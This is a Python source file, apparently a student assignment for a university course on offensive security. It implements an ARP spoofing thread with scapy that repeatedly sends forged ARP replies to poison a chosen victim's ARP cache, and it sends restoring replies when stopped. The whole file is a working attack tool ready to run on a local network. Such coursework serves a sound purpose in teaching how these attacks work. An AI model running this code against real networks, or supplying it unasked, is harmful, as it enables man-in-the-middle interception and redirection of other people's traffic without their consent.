"""
Assignment for course 2IC80, Lab on Offensive Computer Security, at TU/e
Created by;
Daan Boelhouwers(1457152), d.boelhouwers@student.tue.nl
Richard Farla(1420380), r.farla@student.tue.nl
Ivar de Win(1406663), i.j.f.d.win@student.tue.nl
"""


from scapy import packet
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp
from scapy.arch import get_if_hwaddr
import time
import threading


class ARPSpoofing(threading.Thread):

    def __init__(self, interface: str, target_mac: str, target_ip: str, spoofed_ips: list, hosts: dict, delay: int):
        """
        Starts ARP spoofing in a background thread

            :param interface: interface on which DNS requests will be sniffed
            :param target_mac: mac of the host that will be poisoned
            :param target_ip: ip of the host that will be poisoned
            :param spoofed_ips: ip addresses for which false ARP cache entries will be created
            :param hosts: dictionary containing info on all discovered hosts, used for restoring caches
            :param delay: delay between outgoing spoofed arp replies
        """
        super(ARPSpoofing, self).__init__()
        self.interface = interface
        self.target_mac = target_mac
        self.target_ip = target_ip
        self.spoofed_ips = spoofed_ips
        self.hosts = hosts
        self.delay = delay
        self.host_mac = get_if_hwaddr(interface)
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def is_stopped(self):
        return self._stop.isSet()

    def run(self):

        def create_arp_answer(src_ip, src_mac) -> packet:
            """
            Creates a spoofed ARP answer packet with source MAC set to host

                :param src_ip: IP that will set as source IP of the created packet
                :param src_mac: MAC that will be set as source MAC of the created packet
                :return: ARP packet with as source the supplied ip and mac, and as destination the victim
            """

            # Create Ethernet and ARP layers, src MAC is not required as it is host MAC by default
            resp_ether = Ether(dst=self.target_mac)
            resp_arp = ARP(
                op=2,  # 2 = ARP response, 1 = ARP request
                psrc=src_ip,
                pdst=self.target_ip,
                hwsrc=src_mac,
                hwdst=self.target_mac,
            )
            resp = resp_ether / resp_arp

            return resp

        def arp_spoof() -> None:
            """
            Sends one spoofed ARP packets for every single spoofed IP to the victim
            """
            for ip in self.spoofed_ips:
                spoofed_ans = create_arp_answer(ip, self.host_mac)
                sendp(spoofed_ans, iface=self.interface, verbose=False)

        print(f"Now ARP spoofing {self.target_ip}...")
        while True:
            if self.is_stopped():
                print("Stopped ARP spoofing")
                print("Now restoring ARP cache of victim")
                for spoofed_ip in self.spoofed_ips:
                    # Get correct (non-spoofed) mac address corresponding to the IP
                    for mac in self.hosts[self.interface]:
                        for ip in self.hosts[self.interface][mac]:
                            if spoofed_ip == ip:
                                restore_resp = create_arp_answer(
                                    spoofed_ip, mac)
                                sendp(restore_resp, iface=self.interface,
                                      verbose=False)

                return
            arp_spoof()
            time.sleep(self.delay)
